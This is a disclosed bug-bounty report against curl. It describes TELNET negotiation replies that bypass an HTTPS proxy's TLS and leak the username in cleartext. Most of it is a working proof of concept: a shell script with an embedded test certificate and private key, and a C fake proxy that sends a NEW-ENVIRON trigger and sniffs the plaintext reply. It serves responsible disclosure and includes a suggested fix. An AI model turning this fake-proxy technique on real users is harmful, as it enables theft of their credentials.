# TELNET control and environment data bypass HTTPS-proxy TLS

- Program: curl
- Weakness / temuan: **TELNET control and environment data bypass HTTPS-proxy TLS**
- Severity: n/a
- State: informative
- Bounty: $0.00
- Upvotes: 13
- Submitted: 2026-09-11
- Disclosed: 2026-09-19
- Report: https://hackerone.com/reports/4021960

## Writeup

Hi,

I found a way to make libcurl send TELNET credential and environment data in cleartext to a TELNET origin, even when the connection is supposedly protected by an HTTPS proxy tunnel. The tunnel's TLS never sees it.

## The bug

For `telnet://` routed through an HTTPS proxy, generic connection setup installs a TLS filter for the proxy hop and then an HTTP CONNECT tunnel filter, both before `telnet_do()` ever runs.

Ordinary TELNET payloads go through `Curl_xfer_send()` and correctly traverse that filter chain. Negotiation and suboption replies don't: several paths call `swrite()` directly on the raw socket instead.

```c
// lib/telnet.c:1044-1047
bytes_written = swrite(conn->sock[FIRSTSOCKET], temp, len);
if(bytes_written < 0)
  failf(data, "Sending data failed (%d)", SOCKERRNO);
```

The same pattern shows up at `lib/telnet.c:235,706,713,996,1015`. `swrite()` writes straight to the operating-system socket, so every one of these control responses bypasses the live TLS filter entirely.

A TELNET origin just has to send a negotiation or subnegotiation command through the tunnel. `telrcv()` dispatches it to `rec_*()` or `suboption()`, and the reply goes out as plaintext bytes on the wire.

NEW-ENVIRON is the sharpest edge here: its response can carry the credential username curl adds automatically, plus any caller-configured environment values. TTYPE and XDISPLOC take the same unprotected path.

Sink: [`swrite()` call in the NEW-ENVIRON suboption handler, `lib/telnet.c:1047`](https://github.com/curl/curl/blob/e5e1c356107ea4f8208757deb69776d94496cfae/lib/telnet.c#L1047).

## PoC

A fake HTTPS proxy plays the malicious TELNET origin: it terminates TLS from curl, answers the CONNECT with `200 Connection established`, then sends a TELNET NEW-ENVIRON subnegotiation trigger *over that TLS session*. It simultaneously watches the raw socket underneath: if curl's reply comes back in cleartext instead of as a TLS record, that's the bug.

Tested against the audit revision `e5e1c356107ea4f8208757deb69776d94496cfae`.

```
checkout: /src
privilege required: LOCAL — this was proved by running the built program, so there's no network principal or login involved
run:      sh /poc-scratch/reproduce.sh exploit
control:  sh /poc-scratch/reproduce.sh control
```

```sh
#!/bin/sh
# Reproduces: telnet:// over an HTTPS proxy leaks the USER credential in
# PLAINTEXT because telnet.c's suboption() replies via swrite() on the raw
# OS socket, bypassing the installed TLS-to-proxy filter.
#
# Overridable knobs (sensible defaults for the build image):
#   VF_PORT   - loopback port the fake HTTPS proxy binds (default 38443)
#   VF_MARKER - marker path the observable checks (default /tmp/vf-telnet-leak-marker)
#   VF_WORK   - scratch dir for generated files (default /tmp/vf-telnet-work)
#
# Arm is $1: "exploit" (proxy sends NEW-ENVIRON trigger) or "control" (does not).
set -e
MODE="$1"
PORT="${VF_PORT:-38443}"
MARKER="${VF_MARKER:-/tmp/vf-telnet-leak-marker}"
WORK="${VF_WORK:-/tmp/vf-telnet-work}"
PROXY_READY="$WORK/proxy_ready"

mkdir -p "$WORK"
rm -f "$MARKER" "$PROXY_READY"

# ---- self-signed cert + key for the fake HTTPS proxy (curl uses --proxy-insecure) ----
cat > "$WORK/cert.pem" <<'CERTEOF'
-----BEGIN CERTIFICATE-----
MIIDBzCCAe+gAwIBAgIUAQGuFO+FHbREZu8aq/G8F3onf8YwDQYJKoZIhvcNAQEL
BQAwEjEQMA4GA1UEAwwHdmZwcm94eTAgFw0yNjA5MDgyMzQxNDZaGA8yMTI2MDgx
NTIzNDE0NlowEjEQMA4GA1UEAwwHdmZwcm94eTCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBALI8NGZtLjHz4hY1F0R9Ldf3x/2CzGyM3YezSO7Xrtu2RF/2
YCYKv+yGtras2f6jrmkUzw228teCsKCKDh6Rnd05FzRPEQ5nWMOYAfuxU3Qap+E5
+TKyve41ZLtaOvV7XM/GZXb1L3aDEpIXp7nLcOOhTv1n/nNGAXViO6MUhtxNj52Q
ZW8dbkDjM7E5Xaz7S9IsgZ1CgiwP/Axm+j8hzuu84Zd1Hq146/uj/oe4kbWFkW/I
oVA75HqeIFo+TrY726THuJFRIk86gy2powvjb2wKvw9W5Z7eYtjh9xai7hJ2TLcH
cMSEGwZGoCZIf+8YhdeKS697mtTKAr45sj2lcGMCAwEAAaNTMFEwHQYDVR0OBBYE
FORDNDHMG2BvZA4s808jj7rban3zMB8GA1UdIwQYMBaAFORDNDHMG2BvZA4s808j
j7rban3zMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAJz7Sn/x
FdSJIpQf/OqVwbpVZWp4dzLkUQJG5iTXJrVUDhzX5y7pgJxjgmUwPoNjdZttWeIf
91afVrMvYwCiDtmaoknCiC+Eyy6YM+SPNm3i8+jix4oHlRr+1/fUZ6yPCdGcgU5q
R65jaCxl6fxB7ZsWVRvy1AKFKwrYwHzDGDEprZ8JlfQYIgqvBHmE0wW3H6HwieBc
ylv3wflR06QS7YY7UkeupSac2C8+n/R7kIMJf64j11yPQi0cdhx7TBLTyN4zLEV4
XFhHHGwq/UzvWCK92IGz0KIDfNF59HqpXwB7ZgC2hnQYtjrgUMdY+BZCIT5z7Vz7
vc/XbDGAl+/WSUA=
-----END CERTIFICATE-----
CERTEOF
cat > "$WORK/key.pem" <<'KEYEOF'
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCyPDRmbS4x8+IW
NRdEfS3X98f9gsxsjN2Hs0ju167btkRf9mAmCr/shra2rNn+o65pFM8NtvLXgrCg
ig4ekZ3dORc0TxEOZ1jDmAH7sVN0GqfhOfkysr3uNWS7Wjr1e1zPxmV29S92gxKS
F6e5y3DjoU79Z/5zRgF1YjujFIbcTY+dkGVvHW5A4zOxOV2s+0vSLIGdQoIsD/wM
Zvo/Ic7rvOGXdR6teOv7o/6HuJG1hZFvyKFQO+R6niBaPk62O9ukx7iRUSJPOoMt
qaML429sCr8PVuWe3mLY4fcWou4Sdky3B3DEhBsGRqAmSH/vGIXXikuve5rUygK+
ObI9pXBjAgMBAAECggEAUQ0cvRlYQQIJZZTmDFCqiMQWb3vMD27tjLikaWyuiR51
MHhfF92akmpea2rmRSxU81cxoyh3fTZisNam/hK1CbVdDn4IIRcxH90fxb/JVgqL
HlpZLstmoI0qTiKFnj1notqzKGnuGAQZ7VKRhOV1ZCZmP8lLRktm/WTa/tmmTEa8
ME9+M45EiWIeGb3tWFsIfOVZ10pS6VBrvGZ4KpCUI7QVDkawC3LPX6nJD5pt1y2K
AnMVkd5pPv/oXsUiRBe++QyBBanVkj54i8N1woksdAZFWI8JYP5FzAkyKGGJ+Gb5
cGbfpzeCIeMO6h2HeFd31AIUs6DQz51n/WHni2wAWQKBgQDnFhgPx6SieAGV95JW
cxR2eWoyIm9LVIiRfi199P6wx1IvDoYlUPz6H8DHk//dP0Ms7FFPSG46zV7LZ1F7
4DmMvuK2hV661Psq5dbOvcH8AsHEuED2r5iUtEV9CnKKfYXjU00AtSy2YmHe6OuT
maj79Kuexpowe44n3oXeiSV7mwKBgQDFc2/X6A4fLIoxVcB6s6xE1vefHYmZ+xni
3fQ/BZ9GL5TsTH0ak8HLgEQ4+u7LwKPi3dSzbWIZa0RljTiI1QnLMOxQJhQb4JZC
U7zX4yCHCq/ixEboumwP5Vr7RNQ6upN/C7R+OU9myvnU8pwpQjL9yiqFtTztow7F
I5JwUCKe2QKBgQDSzQzWGEDPFLodm+IaipA4IzoE0fTEuzB5yKinJj7P9IO7+XvV
vrOHWD/7z76wjW0yJcFmmaQ0b/PxiSaD4l+dTORzq+ZmeLNGxrPVlLTIt5sbYRmh
7z05KdnZ3xXtz+O7I9oysxM+rTCqr792vc2xSdjk1jcB0zQymoN0JZfT0QKBgCD7
NkxnO6yjYPX6r+sPBhB9o+EVKv3ofptxnbHFO6SaoBKUeDUvRyi55StrZuXr6LQl
f7j05XT/gO5Bl5brlvY01tRQd/1sF00+9YVOMAm+lECZroqDUTeahQcBqT2iGq8X
AnAvHH88Gl0ipUkTALd5xH6PFn1PRlFRrs1J5W6JAoGAKlHMtBZT3YrGIKCW++y5
HKPIKwR2+qqwRXm+JvxH84bYLa7KEKL2UQrlpjLVnmHkksxhLkmYXiv5yXynkPBF
aR+ppYVAKWLn1gEJjqS57DTPpwBMrtcmSUzeU2X40KfeL+SL2XFP7gozQsCXYSAK
148NoUUnUafGs0r0a+CQQ1k=
-----END PRIVATE KEY-----
KEYEOF

# ---- test peer: a loopback HTTPS proxy that plays the malicious telnet origin ----
cat > "$WORK/proxy.c" <<'PROXYEOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <poll.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

int main(int argc, char **argv) {
  if(argc < 7) { fprintf(stderr, "usage\n"); return 2; }
  const char *mode = argv[1];
  int port = atoi(argv[2]);
  const char *certf = argv[3], *keyf = argv[4], *markerf = argv[5], *readyf = argv[6];

  SSL_library_init();
  SSL_load_error_strings();
  SSL_CTX *ctx = SSL_CTX_new(TLS_server_method());
  if(!ctx) { ERR_print_errors_fp(stderr); return 3; }
  if(SSL_CTX_use_certificate_file(ctx, certf, SSL_FILETYPE_PEM) <= 0 ||
     SSL_CTX_use_PrivateKey_file(ctx, keyf, SSL_FILETYPE_PEM) <= 0) {
    ERR_print_errors_fp(stderr); return 3;
  }

  int ls = socket(AF_INET, SOCK_STREAM, 0);
  int one = 1;
  setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
  struct sockaddr_in sa; memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  sa.sin_port = htons((unsigned short)port);
  if(bind(ls, (struct sockaddr*)&sa, sizeof(sa)) < 0) { perror("bind"); return 4; }
  if(listen(ls, 1) < 0) { perror("listen"); return 4; }

  int rf = open(readyf, O_CREAT|O_WRONLY|O_TRUNC, 0644);
  if(rf >= 0) close(rf);

  int cs = accept(ls, NULL, NULL);
  if(cs < 0) { perror("accept"); return 5; }

  SSL *ssl = SSL_new(ctx);
  SSL_set_fd(ssl, cs);
  if(SSL_accept(ssl) <= 0) { ERR_print_errors_fp(stderr); return 6; }

  char buf[4096];
  int n = SSL_read(ssl, buf, sizeof(buf)-1);
  if(n > 0) { buf[n]=0; fprintf(stderr, "[proxy] CONNECT req: %.*s\n", n>60?60:n, buf); }

  const char *resp = "HTTP/1.1 200 Connection established\r\n\r\n";
  SSL_write(ssl, resp, (int)strlen(resp));

  if(strcmp(mode, "exploit") == 0) {
    /* Let curl finish CONNECT and enter the telnet poll loop, draining any
     * TLS-buffered bytes, so the trigger is a fresh readable event. */
    struct timespec ts; ts.tv_sec = 1; ts.tv_nsec = 0; nanosleep(&ts, NULL);
    /* IAC SB NEW_ENVIRON IAC SE (255 250 39 255 240): server asks curl for
     * its NEW-ENVIRON environment. curl's suboption() will reply with the
     * USER credential via swrite() on the raw socket. */
    unsigned char trig[5] = {255, 250, 39, 255, 240};
    SSL_write(ssl, trig, sizeof(trig));
    fprintf(stderr, "[proxy] sent NEW_ENVIRON trigger over TLS\n");
  } else {
    fprintf(stderr, "[proxy] control: no trigger sent\n");
  }

  /* Read RAW bytes off the socket (bypassing TLS). If curl honored the TLS
   * filter, everything here would be ciphertext (TLS records start 0x17).
   * The swrite() bypass instead puts the telnet suboption reply in the
   * clear: look for IAC SB NEW_ENVIRON == FF FA 27. */
  unsigned char raw[8192];
  size_t total = 0;
  struct pollfd pfd; pfd.fd = cs; pfd.events = POLLIN;
  for(int i = 0; i < 60 && total < sizeof(raw); i++) {
    int pr = poll(&pfd, 1, 200);
    if(pr <= 0) continue;
    ssize_t r = recv(cs, raw+total, sizeof(raw)-total, 0);
    if(r <= 0) break;
    total += (size_t)r;
    for(size_t j = 0; total >= 3 && j + 2 < total; j++) {
      if(raw[j]==255 && raw[j+1]==250 && raw[j+2]==39) {
        fprintf(stderr, "[proxy] PLAINTEXT NEW_ENVIRON suboption on wire: ");
        for(size_t k=j; k<total; k++) {
          unsigned char c = raw[k];
          if(c>=32 && c<127) fputc(c, stderr); else fprintf(stderr,"\\x%02x", c);
        }
        fprintf(stderr, "\n");
        int mf = open(markerf, O_CREAT|O_WRONLY|O_TRUNC, 0644);
        if(mf >= 0) { if(write(mf, raw+j, total-j)<0){} close(mf); }
        SSL_free(ssl); close(cs); close(ls); SSL_CTX_free(ctx);
        return 0;
      }
    }
  }
  fprintf(stderr, "[proxy] no plaintext suboption framing observed (%zu raw bytes)\n", total);
  SSL_free(ssl); close(cs); close(ls); SSL_CTX_free(ctx);
  return 1;
}
PROXYEOF

# Build the test peer (setup step; not the target under test).
timeout 60 cc $CFLAGS "$WORK/proxy.c" -o "$WORK/proxy" -lssl -lcrypto || exit 1

# Start the fake HTTPS proxy and wait until it is listening.
"$WORK/proxy" "$MODE" "$PORT" "$WORK/cert.pem" "$WORK/key.pem" "$MARKER" "$PROXY_READY" &
PROXYPID=$!
i=0
while [ ! -f "$PROXY_READY" ] && [ $i -lt 100 ]; do i=$((i+1)); sleep 0.1; done

# Everything is up and the shipped runtime is about to be exercised.
: > "${VF_READY:-/dev/null}"

# Drive the SHIPPED curl (bare name -> PATH-resolved /usr/local/bin/curl):
# telnet:// through the HTTPS proxy, with an operator-supplied credential.
timeout 30 curl -sS --proxy-insecure -x "https://127.0.0.1:$PORT" \
    -u "leakeduser42:secretpass" "telnet://target.invalid:23" </dev/null || true

# Give the peer a moment to finish capturing, then clean up.
sleep 1
kill "$PROXYPID" 2>/dev/null || true
wait "$PROXYPID" 2>/dev/null || true
exit 0
```

Running the exploit arm, the proxy's raw-socket reader observed the NEW-ENVIRON suboption reply in plaintext (`IAC SB NEW_ENVIRON` framing, `FF FA 27`) immediately after sending the trigger over TLS: the credential `leakeduser42` travels straight past the tunnel's encryption.

The control arm, which never sends the NEW-ENVIRON trigger, produces no such observation on the raw socket.

## Suggested direction

Replace each direct TELNET `swrite()` with a filter-aware transport helper built on `Curl_xfer_send()` or `Curl_conn_send()`. It needs to handle partial writes, `CURLE_AGAIN`, and timeouts, and propagate failures back to `telnet_do()`. Keep IAC escaping separate from transport encryption so control bytes pass through the connection filters as ordinary protocol data.

Cheers,
Josh

## Impact

Anyone using `telnet://` through an HTTPS proxy tunnel gets less confidentiality than the proxy setup implies. A malicious or on-path-observed TELNET origin can trigger NEW-ENVIRON/TTYPE/XDISPLOC negotiation and read curl's reply in cleartext, including the automatically-added USER credential and any caller-configured environment values. It can also corrupt the TLS stream in the process, failing the transfer after the leak has already happened.

Preconditions:

- A `telnet://` transfer routed through an HTTPS proxy (`--proxy`/`-x` with an `https://` proxy URL).
- A TELNET origin (or an observer positioned to inject on that connection) willing to send a negotiation/subnegotiation command.
